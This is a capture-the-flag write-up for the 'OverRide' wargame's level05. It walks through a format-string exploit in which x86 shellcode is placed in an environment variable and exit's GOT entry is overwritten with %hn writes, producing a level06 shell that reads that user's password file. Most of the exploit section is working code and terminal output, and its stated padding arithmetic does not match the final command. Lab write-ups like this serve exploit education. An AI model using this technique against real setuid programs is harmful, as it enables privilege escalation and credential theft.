# LEVEL05
**Info: level protect option**
```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```
---
```sh
level05@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level05 level05   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
-rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile
level05@OverRide:~$ ./level05 
42
42
level05@OverRide:~$ ./level05 
42 42 42
42 42 42
```
We can find one excutable file **level05**, who works like cat, take standard input and directly prints it in the terminal. \
Check it with GDB. \
\
The code itself looks very simple also we can notice ```format string vulnerability``` at ```main+195``` \
```sh
(gdb) disas main
   ...
   0x08048500 <+188>:   lea    0x28(%esp),%eax # str[100]
   0x08048504 <+192>:   mov    %eax,(%esp)
   0x08048507 <+195>:   call   0x8048340 <printf@plt> # printf(str) @ vulnerability @
   0x0804850c <+200>:   movl   $0x0,(%esp)
   ...
```
There is no system call or any similar function, so we will inject our shell code and try to run. \
First let's lookup our stack and find the offset we can overwrite.
```sh
level05@OverRide:~$ ./level05 
bbbb %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
bbbb 64 f7fcfac0 f7ec3add ffffd66f ffffd66e 0 ffffffff ffffd6f4 f7fdb000 62626262 20782520 25207825 78252078 20782520 25207825
```
The offset is 10. Now we will try to overwrite GOT of exit function. To find address of exit function
```sh
(gdb) x/i 0x8048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0
```
The GOT address of ```exit``` is ```0x80497e0``` \
Let's prepare our shell code by saving it inside the environment variable.
```sh
level05@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
level05@OverRide:~$ cat /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("%p\n", getenv("SHELLCODE"));
}
level05@OverRide:~$ gcc -m32 /tmp/getenv.c
level05@OverRide:~$ cd /tmp
level05@OverRide:~$ ./a.out
0xffffd892
```
And find it's address by using our c code, ```getenv```. \
So we try put our env ```SHELLCODE``` address in the ```exit()``` got address, \
0xffffd892 = 4294957202, we have to substract 4 'cause already print the address of got.
```sh
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "%4294957198d%10$n"; cat) | ./level05
```
But its not work ! the value of %n was so big, we try another way. \
There is options ```%n``` like ```%hn```, ```%hhn```. we try to solve the problem with using ```%hn```. \
We split exactly half the address of env, ```0xffff```, ```0xd892```. \
and by following the little endian form,

|   format    | first  |  last  |
| :---------: | :----: | :----: |
|   **hex**   | 0xd892 | 0xffff |
| **decimal** | 55442  | 65535  |

**First half  :**	$55442 - 8 		   = 55434$\
**Last half :**	$65535 - 55442 - 8 = 10085$
```sh
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55442d%10$hn" + "%10085d%11$hn"'; cat) | ./level05
...
whoami
level06
cat /home/users/level06/.pass
(hidden)
```
level05 passed !

assmebly analyze
---

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     push   %edi
   0x08048448 <+4>:     push   %ebx
   0x08048449 <+5>:     and    $0xfffffff0,%esp
   0x0804844c <+8>:     sub    $0x90,%esp # 144
   0x08048452 <+14>:    movl   $0x0,0x8c(%esp) # i = 0 
   0x0804845d <+25>:    mov    0x80497f0,%eax # stdin
   0x08048462 <+30>:    mov    %eax,0x8(%esp)
   0x08048466 <+34>:    movl   $0x64,0x4(%esp) # 100
   0x0804846e <+42>:    lea    0x28(%esp),%eax # str[100]
   0x08048472 <+46>:    mov    %eax,(%esp)
   0x08048475 <+49>:    call   0x8048350 <fgets@plt> # fgets(str, 100, stdin)
   0x0804847a <+54>:    movl   $0x0,0x8c(%esp)
   0x08048485 <+65>:    jmp    0x80484d3 <main+143> # loop start
   0x08048487 <+67>:    lea    0x28(%esp),%eax # str[100]
   0x0804848b <+71>:    add    0x8c(%esp),%eax # str[i]
   0x08048492 <+78>:    movzbl (%eax),%eax
   0x08048495 <+81>:    cmp    $0x40,%al # 64
   0x08048497 <+83>:    jle    0x80484cb <main+135>
   0x08048499 <+85>:    lea    0x28(%esp),%eax # str[100]
   0x0804849d <+89>:    add    0x8c(%esp),%eax # var i
   0x080484a4 <+96>:    movzbl (%eax),%eax
   0x080484a7 <+99>:    cmp    $0x5a,%al # 90
   0x080484a9 <+101>:   jg     0x80484cb <main+135>
   0x080484ab <+103>:   lea    0x28(%esp),%eax # str[100]
   0x080484af <+107>:   add    0x8c(%esp),%eax # var i
   0x080484b6 <+114>:   movzbl (%eax),%eax
   0x080484b9 <+117>:   mov    %eax,%edx
   0x080484bb <+119>:   xor    $0x20,%edx # str[i] ^ 32
   0x080484be <+122>:   lea    0x28(%esp),%eax # str[100]
   0x080484c2 <+126>:   add    0x8c(%esp),%eax # var i
   0x080484c9 <+133>:   mov    %dl,(%eax) # save xor result str[i] ^= 32
   0x080484cb <+135>:   addl   $0x1,0x8c(%esp) # i++
   0x080484d3 <+143>:   mov    0x8c(%esp),%ebx # var i
   0x080484da <+150>:   lea    0x28(%esp),%eax # str[100]
   0x080484de <+154>:   movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:   mov    %eax,%edx # str[100]
   0x080484e8 <+164>:   mov    $0x0,%eax # 0
   0x080484ed <+169>:   mov    0x1c(%esp),%ecx # 0xffffffff
   0x080484f1 <+173>:   mov    %edx,%edi # str
   0x080484f3 <+175>:   repnz scas %es:(%edi),%al # strlen(str)
   0x080484f5 <+177>:   mov    %ecx,%eax 	# strlen ex)
   0x080484f7 <+179>:   not    %eax		 	# 0x0011 = 2 "hi\0"
   0x080484f9 <+181>:   sub    $0x1,%eax 	# 0x1111 - 0x0011 = 0x1100 ~ => 0x0011 - 1 = 0x0010
   0x080484fc <+184>:   cmp    %eax,%ebx # i < strlen(str)
   0x080484fe <+186>:   jb     0x8048487 <main+67>
   0x08048500 <+188>:   lea    0x28(%esp),%eax # str[100]
   0x08048504 <+192>:   mov    %eax,(%esp)
   0x08048507 <+195>:   call   0x8048340 <printf@plt> # printf(str) @ vulnerability @
   0x0804850c <+200>:   movl   $0x0,(%esp)
   0x08048513 <+207>:   call   0x8048370 <exit@plt> # exit(0)
End of assembler dump.
```